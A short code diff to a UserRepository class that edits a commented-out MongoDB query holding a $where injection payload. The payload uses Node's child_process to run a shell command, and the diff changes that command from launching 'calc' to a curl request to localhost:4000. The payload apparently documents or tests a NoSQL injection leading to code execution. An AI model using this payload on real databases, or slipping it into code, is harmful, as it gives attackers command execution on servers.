@@ -39,7 +39,7 @@ class UserRepository {
             //         {
             //             $or: [
             //                 {
-            //                     $where: 'typeof global != "undefined" ? global.process.mainModule.constructor._load("child_process").exec("calc"): 1'
+            //                     $where: 'typeof global != "undefined" ? global.process.mainModule.constructor._load("child_process").exec("curl http://localhost:4000") : 1'
             //                 }
             //             ]
             //         }
